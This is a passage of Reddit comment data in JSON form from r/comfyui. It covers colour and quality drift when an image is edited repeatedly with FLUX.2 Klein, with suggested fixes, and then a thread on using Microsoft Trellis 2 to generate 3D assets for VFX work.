              "created_utc": "2026-01-23 12:57:11",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1710y8",
          "author": "_VirtualCosmos_",
          "text": "Same with Qwen Edit",
          "score": 4,
          "created_utc": "2026-01-23 06:33:01",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o17xe5o",
          "author": "Luke2642",
          "text": "GROUPTHINK ALERT - THIS IS NOT CAUSED BY VAE.\n\nThe colour shift is caused by the ksampler applying a STD + MEAN shift to move the distribution across the channels from being more like the noise to more like the distribution statistics of the VAE.\n\nIf you pass it through six times you get a slight fading effect, that is all. No colour shift.\n\nIf you add a latent multiply, the fading effect vanishes. No colour shift.\n\nhttps://preview.redd.it/v6zdrrp343fg1.png?width=3234&format=png&auto=webp&s=8fd5da77168a7727d09bff6209f1e766089799ac",
          "score": 6,
          "created_utc": "2026-01-23 11:21:04",
          "is_submitter": false,
          "replies": [
            {
              "id": "o19bs7f",
              "author": "BathroomEyes",
              "text": "You really should be using the Flux2 vae in your example if you‚Äôd like to make an apples to apples demonstration. Unless that‚Äôs just what you‚Äôve renamed your flux2 vae.",
              "score": 1,
              "created_utc": "2026-01-23 16:04:06",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o19i7ro",
                  "author": "Luke2642",
                  "text": "yeah, they named it ae.safetensors originally, which I think was an error. So at least I should call it flux\\_vae.safetensors!\n\n[https://huggingface.co/black-forest-labs/FLUX.1-dev/tree/main](https://huggingface.co/black-forest-labs/FLUX.1-dev/tree/main)",
                  "score": 2,
                  "created_utc": "2026-01-23 16:32:57",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o185l2z",
              "author": "Luke2642",
              "text": "That is absolutely not all. The details degrade with each successive trip in and out of latent space, depding on the VAE.¬†[Comparison between input and 8x encode/decode cycles](https://imgsli.com/NDQ0NjY3).",
              "score": 0,
              "created_utc": "2026-01-23 12:22:31",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o18eyej",
                  "author": "eagledoto",
                  "text": "So the latent multiply works?",
                  "score": 1,
                  "created_utc": "2026-01-23 13:21:17",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o16ormt",
          "author": "krigeta1",
          "text": "Same thing happened with nano banana pro gemini app too, when I am keeping asking for edits the quality degraded by each step, have you tried with an actual image? I guess it could be a thing with nano banana pro images and its watermark. But is it just amu assumption.",
          "score": 3,
          "created_utc": "2026-01-23 05:01:36",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16u9wt",
              "author": "eagledoto",
              "text": "Havent tested it on a real image, but i believe once its processed by ai, it would start to have the same issue of one tries to edit it again and again.",
              "score": 1,
              "created_utc": "2026-01-23 05:40:30",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o17a5sa",
          "author": "magik111",
          "text": "for me sometimes help add to prompt \"Strictly preserve all original colors from the photo, maintain exact color tones, saturation, and hues without any changes. Be completely consistent with the photo's color palette throughout the entire image\"",
          "score": 3,
          "created_utc": "2026-01-23 07:51:02",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o17cuiw",
          "author": "TBG______",
          "text": "Colorshifts in Diffusion + VAE workflows in ComfyUI mainly originate from three technical sources.\n\n\n1. Model capacity and reconstruction error\n\nEvery diffusion model has limited capacity to perfectly reconstruct image content. During iterative, these reconstruction errors accumulate. This becomes most visible in uniform, low-entropy regions such as pure black, gray, or white areas. The observed color shift is therefore not random noise, but the model‚Äôs inability to exactly reproduce flat tonal regions across generations.\n\n2. Inpainting and differential diffusion leakage\n\nInpainting introduces unavoidable leakage, even when differential diffusion is implemented directly within the model. Color and sharpness changes are not confined to the masked region, they also affect unmasked areas.\nEven with a fully black (0) mask, subtle changes can be observed outside the intended edit region. Increasing the number of inpainting steps amplifies this effect, causing gradual drift in color and detail both inside and near the mask boundaries.\n\n3. VAE encoding and decoding shifts\n\nVAE-induced color shifts are a well-known issue and have already been thoroughly documented. Any pixel-to-latent and latent-to-pixel conversion introduces small but cumulative deviations in color and contrast.\n\nUsing tiled VAE encoding/decoding generally produces better local color stability compared to full-frame VAE passes, especially at high resolutions. However, tiled VAEs introduce small rounding and boundary errors at tile borders. More details here : https://www.patreon.com/posts/147809146\n\nThere is only one reliable method to exactly maintain image content:\nDo not pass it through the sampler.\n\nThis makes crop-and-stitch workflows essential. Ideally, these operations should happen entirely in pixel space, using the original image data. Even a single VAE encode/decode pass alters the image, so avoiding unnecessary latent conversions is critical when preservation is required.\n\nIn the TBG ETUR Enhanced Tiled Upscaler and Refiner, these principles are fully automated:\n\t‚Ä¢\tCrop-and-stitch handling\n\t‚Ä¢\tVAE correction\n\t‚Ä¢\tLanpaint\n\t‚Ä¢\tMulti-object editing in a single pass\n\nThis allows you to modify many separate objects while keeping the background fully intact.\n\nHow it works\n\nYou can either:\n\t‚Ä¢\tUse the SAM segmentation nodes, or\n\t‚Ä¢\tManually mask all target elements\n\nPass the masks and the input image through the Upscaler and Tiler node with:\n\t‚Ä¢\tUpscale = None\n\t‚Ä¢\tPreset = Full Image\n\nThis configuration converts the workflow into an advanced inpainting pipeline, rather than a tiled upscaler.\n\nThe ‚ÄúETUR Tile Overrides‚Äù node enables:\n\t‚Ä¢\tAutomatic prompt generation\n\t‚Ä¢\tPer-segment prompt assignment\n\t‚Ä¢\tAdditional conditioning per selected element\n\nThe Refiner then applies all modifications while preserving the background. Optionally, the background itself can be refined in the same pass if desired.\n\nThis workflow has been tested with:\n\t‚Ä¢\tFlux, Qwen,ZIT,SD,SDXL,CHROMA\n\t‚Ä¢\tFlux Inpaint\n\t‚Ä¢\tFlux Kontext\n\nIt has not yet been tested with Flux2 Klein, but it should work similarly. Alternatively, a manual crop-and-stitch approach can be used to achieve comparable results.\n\nCore rule\n\nNever sample content that must remain unchanged.",
          "score": 3,
          "created_utc": "2026-01-23 08:15:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o17fjnq",
              "author": "TBG______",
              "text": "This gives me an idea: I could add an inpainting-only mode switch to TBG ETUR. Let me know if this would be useful for you.",
              "score": 2,
              "created_utc": "2026-01-23 08:40:05",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o19cckj",
                  "author": "BathroomEyes",
                  "text": "I would find this very useful, thank you!",
                  "score": 1,
                  "created_utc": "2026-01-23 16:06:41",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o18elho",
              "author": "eagledoto",
              "text": "Will test with ZIT, thank you!",
              "score": 1,
              "created_utc": "2026-01-23 13:19:15",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o16gj3n",
          "author": "alsshadow",
          "text": "Looks funny",
          "score": 2,
          "created_utc": "2026-01-23 04:08:26",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o16r5js",
          "author": "admajic",
          "text": "I use the two image workflow. Put both images in. In image 2 I color the parts I don't want it to touch in red. Then prompt what I want it to do",
          "score": 2,
          "created_utc": "2026-01-23 05:17:58",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o16tlek",
          "author": "mac404",
          "text": "You should be able to fairly easily make all 3 of those changes in a single prompt.  \n\nDoing multiple VAE Encode/Decode passes will degrade the quality over time, but not necessarily to the degree you see here. You will see a color shift with every gen, but it should be only noticeable when doing more intense back-and-forth comparisons (whereas it's quite obvious here).  \n\nIn your example, after the first change you also already had some shifting / squishing of the image. This can happen sometimes, I've found it's usually a good idea to try 2-4 seeds with the same prompt and then pick the best one. You are also running at a resolution that is getting too high for Klein to handle well (1536 x 2752), and it will generally be much less stable because of that. I have generally found (although I haven't tested overly scientifically) that keeping the longest side below about 2k resolution will improve stability significantly when making changes. The model itself tends to output images that are so sharp / clear that I don't find the resolution limitation to actually be all that limiting.  \n\nNot perfect, but [here was the very first image I got](https://imgsli.com/NDQ0NTU4) when I tried with this prompt (after downloading the original PNG of your first image):  \n\n> Subject's shirt is black. Remove the subject's earrings. Remove the people from the background. Keep the subject‚Äôs pose and framing unchanged.  \n\nBecause the res is so high, you still get a little bit of squashing/stretching that's noticeable in the face. Maybe it would be perfect in a different seed if you tried a few. Hair color is slightly darker and the coffee cup also darkens slightly, but skin color stayed basically the same. There's a random out-of-focus person that got added into the background and a few other random changes, too. But not bad for literally the first try with a simple multi-change prompt.",
          "score": 2,
          "created_utc": "2026-01-23 05:35:30",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16zoud",
              "author": "eagledoto",
              "text": "yep definitely, I could do all that with a single prompt, but that was not my main focus, i was just playing around and noticed it as i didn't know about the color shifting.\n\nRegarding resolution, yes i believe its odd and pretty high.\n\nThe output you got is pretty decent yes.\n\nThank you for the detailed comment. Means alot!",
              "score": 1,
              "created_utc": "2026-01-23 06:22:12",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1725sj",
                  "author": "mac404",
                  "text": "Sure! And gotcha, makes sense.  \n\nAnother random note on prompting - basically anything you mention in the prompt will get changed in some way. You can always try variations on \"Keep ___ unchanged\" and it will often work pretty well.  And as weird as it feels, I find just puttring \"[object] is [color]\" can work better than \"change [color] to [other color]\". \"Remove\" and \"replace\" are pretty good prompt words, though.",
                  "score": 2,
                  "created_utc": "2026-01-23 06:42:22",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1728ai",
          "author": "Downtown-Bat-5493",
          "text": "*Quality degradation with each pass. \n\n\nJust compare her face in first image to the last.",
          "score": 2,
          "created_utc": "2026-01-23 06:42:55",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1742jb",
          "author": "Amirferdos",
          "text": "Don‚Äôt think about the VAE, it‚Äôs working good in 4B model.\nSo the problem is in 9B model",
          "score": 2,
          "created_utc": "2026-01-23 06:57:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1msa6l",
              "author": "eagledoto",
              "text": "Ah, will test it out",
              "score": 1,
              "created_utc": "2026-01-25 15:34:26",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1880od",
          "author": "Aromatic-Somewhere29",
          "text": "You can disable all groups except the first one and rerun the workflow until you get the result you want. Then, lock the seed, enable the second group, and repeat the process. You can copy and paste the last group to extend the chain. \n\nhttps://preview.redd.it/nh8qo9dwo3fg1.png?width=6121&format=png&auto=webp&s=e15e5c3ded9cad14674dd1acf0058b57adc7550c",
          "score": 2,
          "created_utc": "2026-01-23 12:38:50",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18eh8m",
              "author": "eagledoto",
              "text": "Thank you will try it out",
              "score": 1,
              "created_utc": "2026-01-23 13:18:36",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o18gv12",
                  "author": "Aromatic-Somewhere29",
                  "text": "I'm not sure if the workflow saved properly, here's a second attempt with small refinements. Looks like Reddit converts .png to .webp and removes the embedded workflow. I‚Äôve uploaded the .json file here: [https://pastebin.com/pqQfeHLD](https://pastebin.com/pqQfeHLD)\n\nhttps://preview.redd.it/2lpuhok6r3fg1.png?width=5874&format=png&auto=webp&s=5176e79bbee7a784170182a93318d76452b0a6a4",
                  "score": 2,
                  "created_utc": "2026-01-23 13:31:44",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1ee9vm",
                  "author": "Aromatic-Somewhere29",
                  "text": "Have you had a chance to try it? I‚Äôm curious whether it helped streamline your workflow.\n\nThe main idea here is to avoid the kind of manual overhead described in that long comment - things like saving intermediate latent files, digging through folders to find the right one, copying and pasting them back into the graph, and reloading just to make a tiny adjustment. That approach works in a pinch, but it‚Äôs not how latent-space editing was really meant to be used within a single, continuous generation task.\n\nIn ComfyUI the standard and most efficient approach for iterative refinement is chaining KSamplers and passing the latent directly from one to the next. This keeps everything in memory, avoids file clutter, and lets you isolate each edit step cleanly.\n\nThat‚Äôs exactly what this workflow does: each KSampler handles one specific change (e.g., pose, lighting, expression), and the latent flows sequentially down the chain. You can disable all but the first group, iterate until you‚Äôre happy, lock the seed, then move on to the next stage - all without ever touching the filesystem.\n\nIt‚Äôs a bit wordy, I know, but maybe my take on this gets missed because it hasn‚Äôt been explained in enough detail.",
                  "score": 1,
                  "created_utc": "2026-01-24 09:27:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o191o87",
          "author": "TekaiGuy",
          "text": "Edit models are always destructive which is why I don't even bother with them.",
          "score": 2,
          "created_utc": "2026-01-23 15:18:05",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1mq3b0",
              "author": "Comfortable_Swim_380",
              "text": "Probably good advice. The custom wan ones I tried for example just blow up the workflow. Dont even work.",
              "score": 1,
              "created_utc": "2026-01-25 15:24:12",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1f2vzy",
          "author": "TBG______",
          "text": "I propose a potential solution that replaces the unedited areas with the corresponding regions from the original image to prevent degradation: [https://www.reddit.com/r/comfyui/comments/1qkog35/comment/o1f292l/?utm\\_source=share&utm\\_medium=web3x&utm\\_name=web3xcss&utm\\_term=1&utm\\_content=share\\_button](https://www.reddit.com/r/comfyui/comments/1qkog35/comment/o1f292l/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button) \\- After testing it with SAM, which requires manual input of elements, I‚Äôve created a new node that can automatically detect the affected areas without SAM, allowing the process to be fully automated.\n\nHowever, I noticed that many contour edges are affected in the output of the sampler. This could make the issue a bit tricky to resolve. The new TBG Difference Mask node compares two images, mixes SSIM (structure) and RGB difference (color), then thresholds and area-filters to isolate real, coherent changes (like a shirt swap) while ignoring tiny model artifacts and noise.\n\nTBG Takeaways with the new TBG Difference Mask node are now uploaded and accessible from the Manager. The workflow for the SAM and Diff nodes can be found here:¬†[https://www.patreon.com/posts/149003920](https://www.patreon.com/posts/149003920)¬†(free access). SAM version works always but Diff Mask only if diff is significant.\n\nhttps://preview.redd.it/tvi98fzloafg1.png?width=1336&format=png&auto=webp&s=3b28ffe8b7e40aee43b6dd595bc72961dea63253",
          "score": 2,
          "created_utc": "2026-01-24 12:57:57",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1inhne",
              "author": "eagledoto",
              "text": "I got the workflow running till some extent, I am getting white edges around the shirt no matter how much i play with the mask settings, is there any way to perfectly mask the shirt?",
              "score": 1,
              "created_utc": "2026-01-24 23:17:21",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1iqt1w",
                  "author": "TBG______",
                  "text": "You need to extend the mask area beyond the blur margin. Besides that I tested different edits: shirts works, but more subtle changes still require manual masking, so it‚Äôs not a perfect workaround, just a starting point.",
                  "score": 2,
                  "created_utc": "2026-01-24 23:34:39",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1iopis",
                  "author": "eagledoto",
                  "text": "https://preview.redd.it/htip1b6esdfg1.png?width=752&format=png&auto=webp&s=165a61ea8ecc92af00fd42b15c47d8388157a0ed\n\n[https://pastebin.com/Lh8YbrKM](https://pastebin.com/Lh8YbrKM) these are the workflow settings",
                  "score": 1,
                  "created_utc": "2026-01-24 23:23:36",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o173w2b",
          "author": "Rude_Dependent_9843",
          "text": "In my experience, I've found that this depends on the seed. Since the distilled model, according to FL Studio, already exhibits less variability, what I do is add a seed randomization module: I use Easy Seed (I've also added RGthree Seed, but for some reason it makes the flow heavier). Because generation is fast, I run some tests, and let's say 1 out of every 3 results has a balanced color correction.",
          "score": 1,
          "created_utc": "2026-01-23 06:56:29",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1747f3",
              "author": "eagledoto",
              "text": "Regarding seed, the seed doesnt change every time I generate something, it's set to randomized but I believe I am looking at a different seed? It's the noise seed something, sorry I am on my phone so I can't tell you what it was exactly",
              "score": 1,
              "created_utc": "2026-01-23 06:59:05",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o17ap59",
          "author": "StableLlama",
          "text": "My main observation is that it gives the image warmer colors.\n\nAnyway, when the colors and saturation isn't kept, actually when the values of the not edited pixels isn't kept it's bad.\n\nIMHO there are two ways to solve it:\n\n* Train the model better. (My guess is, that the VAE doesn't keep the error function. I.e. a pixel change resulting in a Delta E and luminosity change of \"err\" should create after the same change in latent space also an error of \"err\". Most likely the VAE wasn't trained with that constraint). But that's nothing you can do.\n* Use masking. Only allow the model to change the pixels you are allowing it to, the others are prevent from changing with a mask.\n\nWith tools like Krita AI it's very simple to mask the area that is allowed to change. With Comfy itself you need to adapt your workflow.",
          "score": 1,
          "created_utc": "2026-01-23 07:55:54",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o19lgxg",
          "author": "Comfortable_Swim_380",
          "text": "Your scheduler can be causing that I would try something more advanced",
          "score": 1,
          "created_utc": "2026-01-23 16:47:29",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1hh2gk",
              "author": "eagledoto",
              "text": "What If i use the default ksampler instead of this?\n\nhttps://preview.redd.it/qy84l2isqcfg1.png?width=622&format=png&auto=webp&s=f0181fb2af4772fbdf408a686e93c2ce1e1e6a01",
              "score": 2,
              "created_utc": "2026-01-24 19:53:22",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1hgrxn",
              "author": "eagledoto",
              "text": "I am using the Flux2Scheduler, can you suggest anything else?",
              "score": 1,
              "created_utc": "2026-01-24 19:52:03",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1mp4p1",
                  "author": "Comfortable_Swim_380",
                  "text": "# Current Working Setup\n\n**For video:**  \n**2 Sampler Setup (ie WAN 2.2)**\n\n|Steps|Sampler|Scheduler|\n|:-|:-|:-|\n|0-15|res\\_multistep|beta57|\n|15-40|res\\_2s|beta 57|\n\n**1 Sampler Setup (ie WAN 2.1)**\n\n|Steps (Total)|Sampler|Scheduler|\n|:-|:-|:-|\n|0-35|res\\_2s/ unipc|beta57|\n\n**For image (ie FLUX):**\n\n|Steps (Total)|Sampler|Scheduler|\n|:-|:-|:-|\n|20-35|uni\\_pc (good for high detail)|beta57|\n|\\~20-30|eular (good for dramatic changes)|beta57|",
                  "score": 1,
                  "created_utc": "2026-01-25 15:19:45",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1dc20p",
          "author": "tarkansarim",
          "text": "That‚Äôs why I always use photoshop to only adopt the parts I‚Äôve changed onto the original image for local edits. Obviously that doesn‚Äôt work for global edits like lighting but that‚Äôs also not something you would do repeatedly on the same image.",
          "score": 1,
          "created_utc": "2026-01-24 04:15:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1gzxi6",
          "author": "Suitable-League-4447",
          "text": "is someone here having a solution for qwen edit 2509 or 2511 as it changes completely the face of the input image person and wondering if what is explained here could help? im working on pose transfer i2i workflow.",
          "score": 1,
          "created_utc": "2026-01-24 18:38:19",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1hepgl",
              "author": "eagledoto",
              "text": "Try out flux 2 edit, or qwen 2512.",
              "score": 1,
              "created_utc": "2026-01-24 19:42:47",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1lgkl9",
                  "author": "Suitable-League-4447",
                  "text": "wdym by flux2 edit? there's not edit version of flux2 u meant klein?",
                  "score": 1,
                  "created_utc": "2026-01-25 10:22:22",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o16hvpt",
          "author": "Key-Tension1528",
          "text": "All models have some sort of bias and do this. If you repeat enough times the bias will make it drift into nonsense. You could try passing it through a color match node with the original image.",
          "score": 0,
          "created_utc": "2026-01-23 04:16:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16u5cx",
              "author": "eagledoto",
              "text": "https://preview.redd.it/r94ndihld1fg1.png?width=1173&format=png&auto=webp&s=093afeebace3bfb939581678389af7bac1b18606\n\nAm i supposed to do it like this? sorry m a noob at this, started a few days ago.",
              "score": 1,
              "created_utc": "2026-01-23 05:39:34",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o16q9ku",
          "author": "TomorrowNeverKnowss",
          "text": "Other than the increased saturation, that actually looks really good. Can you share your workflow?",
          "score": 1,
          "created_utc": "2026-01-23 05:11:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16tr2w",
              "author": "eagledoto",
              "text": "I am using the default workflow from here, everything should be there if you want to download.\n\n[https://docs.comfy.org/tutorials/flux/flux-2-klein](https://docs.comfy.org/tutorials/flux/flux-2-klein)",
              "score": 2,
              "created_utc": "2026-01-23 05:36:39",
              "is_submitter": true,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qjzdr8",
      "title": "I tested Microsoft Trellis 2 for real VFX work ‚Äî honest thoughts from a 15-year 3D artist",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/r/comfyui/comments/1qjzdr8/i_tested_microsoft_trellis_2_for_real_vfx_work/",
      "author": "ArcticLatent",
      "created_utc": "2026-01-22 16:38:04",
      "score": 83,
      "num_comments": 26,
      "upvote_ratio": 0.97,
      "text": "I just released a new YouTube video where I take a **realistic, production-focused look** at **Trellis 2**, a 3D generation model from **Microsoft** that creates textured 3D assets from images.\n\nFrom a technology standpoint, this is genuinely impressive‚Äîespecially for an open-source model. Generating geometry and textures together, quickly, is a big step forward for AI-driven 3D workflows.\n\nThat said, after **15 years working as a 3D modeling and texturing artist in the VFX industry**, it‚Äôs also easy to see the current limitations.  \nTopology quality, clean shapes, and UVs are still not at a level where these assets can be dropped directly into production without additional work.\n\nIn the video, I cover:  \n‚Ä¢ Where Trellis 2 already provides real value (prototyping, base meshes, background assets, 3D printing)  \n‚Ä¢ Why fundamental 3D principles still matter  \n‚Ä¢ How I see AI 3D models evolving for real production use\n\nI‚Äôm also currently **building a bridge plugin for Autodesk Maya and Blender** to make it easier to move AI-generated 3D assets from ComfyUI into real DCC workflows‚Äîfocusing on practical, artist-friendly integration rather than hype.\n\nI‚Äôm **not trying to hype or dismiss AI**‚Äîjust share an **honest, experience-driven perspective** for artists and studios navigating this space.\n\n‚ñ∂Ô∏è Watch the full video here: [https://www.youtube.com/watch?v=r8KEuOEudlI](https://www.youtube.com/watch?v=r8KEuOEudlI)  \nüîß Workflows used in the video: [https://github.com/ArcticLatent/ComfyUI-TRELLIS2/tree/main/workflows](https://github.com/ArcticLatent/ComfyUI-TRELLIS2/tree/main/workflows)  \nüé¨ My professional VFX work (if you are interested): [https://vimeo.com/1044521891](https://vimeo.com/1044521891)",
      "is_original_content": false,
      "link_flair_text": "Tutorial",
      "permalink": "https://reddit.com/r/comfyui/comments/1qjzdr8/i_tested_microsoft_trellis_2_for_real_vfx_work/",
      "domain": "self.comfyui",
      "is_self": true,
      "comments": [
        {
          "id": "o12oqx2",
          "author": "an80sPWNstar",
          "text": "I appreciate this. I don't plan on taking the time to learn to become an experienced 3d artist like yourself, it's just not an option for me. I do however see the value in tools that can help bridge that gap because I love art, computers and learning. I will check out your video.",
          "score": 9,
          "created_utc": "2026-01-22 16:46:26",
          "is_submitter": false,
          "replies": [
            {
              "id": "o12p22o",
              "author": "ArcticLatent",
              "text": "Thank you for your thoughts!",
              "score": 2,
              "created_utc": "2026-01-22 16:47:51",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1324om",
          "author": "FugueSegue",
          "text": "I have heard of this but haven't investigated it yet. Thank you for your work. I worked in 3D many years ago and I sometimes return to it when I need a quick reference for illustration or painting. I skimmed your video and I can clearly see how this is a huge boon to 3D animation. In some ways, I'm glad that I left that career.\n\nWhen I was a student in the 1990s, 3D was new. We constantly worked very hard trying to do the simplest things like flowing water or animating a figure. Countless hours were spent trying to achieve an effect. And then the following year a new app or update was released and what used to take an extreme amount of time would now take no time at all. The innovations were both welcome and frustrating. I think back on the months of time that are lost forever. Time I could have spent doing ANYTHING else.\n\nI realized that trying to do cutting edge animation was pointless unless I worked with a massive crew of people. I never liked the idea of working for a company and work for peanuts making animated toothbrushes. I had my own ideas. And I could see the trajectory: what once took a crew of a dozen could eventually be done by one person in the same amount of time. I became disillusioned. I no longer wanted to spend all my time trying to make animations when production would be so much easier in the near future. So I quit and returned to traditional fine art, sketching, and illustration.\n\nAs time went by, the 3d production pipeline didn't get much simpler. Everything else except for modelling got simpler and better. I still had to spend massive amounts of time designing and building models. It looks like generative AI is proving to be useful for streamlining this aspect of animation production.\n\nWhen I first started experimenting with gen AI in 2022, I instantly saw its value and I knew I would use it as a medium for the rest of my life. It is extremely obvious to me that it is a massive upgrade to digital art and animation production. What you've demonstrated is the latest example.",
          "score": 6,
          "created_utc": "2026-01-22 17:47:05",
          "is_submitter": false,
          "replies": [
            {
              "id": "o13aoas",
              "author": "ArcticLatent",
              "text": "Thank you very much for your thoughts! There is a funny section in the video that I am saying 'It is 2026 and we are still doing uv unwrapping! why??!' :D",
              "score": 2,
              "created_utc": "2026-01-22 18:24:50",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o16vkjp",
          "author": "turbosmooth",
          "text": "take a look at ultrashape as well, really impressive! Even on low VRAM gpus.\n\nhttps://github.com/jtydhr88/ComfyUI-UltraShape1\n\nHunyuan3D-2.2 has a PBR texture generator as well, its just a pain to setup but its good to have alternatives. \n  \nAs a technical artist myself, I have to admit these models do help quite a bit, and because I know how to retopo and clean the asset, its been a breeze to prototype iteratively and quickly. \n  \nWith all that being said, what are future 3d artists actually going to learn moving forward? Will this just be a pay to create or subscription model in a few years time? \n  \nLook at how poorly adobe have implemented genAI content fill, should we expect the same for substance? I have no idea, but maybe I'm just turning into a jaded creative telling kids to get off my virtual lawn!",
          "score": 3,
          "created_utc": "2026-01-23 05:50:08",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1cymyu",
              "author": "Erik_malkavia",
              "text": "If I were you turbosmooth I would look at how you can profit from this technology and perhaps that is a way to stay positive about the changes?\n\nI am a musician and I see what is being done in that space is a bit discouraging for me as well.",
              "score": 2,
              "created_utc": "2026-01-24 02:52:09",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o14sk57",
          "author": "Neex",
          "text": "Sick ChatGPT post bro",
          "score": 2,
          "created_utc": "2026-01-22 22:38:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o15dyvr",
              "author": "AnOnlineHandle",
              "text": "Yeah I'm really baffled and kind of sad that people can't immediately spot these posts which always have the same length, same weird formatting with excessive text bolding etc, always using emoticons as dot points (who the hell is going to really spend their time hunting down each of these weird emoticons?), the same little point lists, and always citation links at the end.",
              "score": 1,
              "created_utc": "2026-01-23 00:31:15",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o136xyx",
          "author": "RobotToaster44",
          "text": "How does it compare to hunyuan?",
          "score": 1,
          "created_utc": "2026-01-22 18:08:24",
          "is_submitter": false,
          "replies": [
            {
              "id": "o13gn99",
              "author": "ArcticLatent",
              "text": "I only tested the open source hunyuan (2.0) and I like the results of trellis 2 better.",
              "score": 2,
              "created_utc": "2026-01-22 18:51:02",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o13q2tz",
          "author": "PolyBend",
          "text": "AI for 3D still has a long way to go. I do think it will get there. There are just so many hills it has to climb still.\n\nThe fact we can still barely get 2d generation to do exactly what we want... And to even get close is a LOT of work, proves this.\n\nLike you said, topology, UVs, and multiple map types are still so far away.\n\nIt doesn't help either that artists in the industry are so underpaid and so oversaturated. So the cost to benefit ratio isn't there yet.\n\nStill, what a lot of these companies need to be focusing on first is tools, not all in 1 solutions.\n\nFirst make an AI tool that UVs for me\n\nThen make one that retopos for me.\n\nNow combine those....",
          "score": 1,
          "created_utc": "2026-01-22 19:33:22",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o15fnht",
          "author": "phunkaeg",
          "text": "Also a VFX artist - I've just completed a project partially using InfiniteTalk to fix some lipsync issues in a short film where the creature prosthetic the actor was using was interfering with how they were speaking. \n\nI've used deepfaking process before to do a similar effect but that involved a lot more work. And before deepfaking you'd need to either manipulate each frame by hand, or recreate the mouth as a 3d model and animate the changes that way. \n\nAi is definitely another very power tool in a VFX artists toolbox.",
          "score": 1,
          "created_utc": "2026-01-23 00:40:08",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o16d052",
          "author": "pixel8tryx",
          "text": "I wanted to install the last 3D generator I heard about but it needed a different attention pkg and I'd just gotten Triton/Sage working.  What does this use?\n\nFor me, if it's simple, it's better for me to make it myself in Cinema 4D.  If it's a complex object, it might be interesting to try.   What I've tried on HuggingFace for past models worked surprisingly well considering the complexity of my test vehicles and odd viewing angle.  I was surprised it managed to approximate the basic shape.  But the detail was lacking, the mesh was a mess and awful to try to texture map.  I don't work with a lot of UV maps usually and find C4D's UV support ok when everything works but hair-pulling when it doesn't.   \n\nIt looks like this generates photogrammetry-style maps?  Packed, Atlas, whatever they're called?  No other option?  If it would actually make a decent model from some complex novel style space ship or something, it might be worth the effort to retexture.  But I have no interest in making Yet Another Generic vehicle, or device or whatever. That's why I'm using AI image generation tools in the first place.  If one needs to crank out a dozen low poly plant zombies or something maybe it's useful.",
          "score": 1,
          "created_utc": "2026-01-23 03:47:02",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o16ghu8",
          "author": "1Neokortex1",
          "text": "![gif](giphy|hVYVYZZBgF50k)\n\nThat would be phenomenal to have a connection from comfyui to blenderü´°",
          "score": 1,
          "created_utc": "2026-01-23 04:08:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o177cku",
          "author": "fisj",
          "text": "Nice breakdown from a professional point of view. I subbed your channel, and also crossposted this to r/aigamedev",
          "score": 1,
          "created_utc": "2026-01-23 07:26:10",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o196vgf",
          "author": "Lil_Twist",
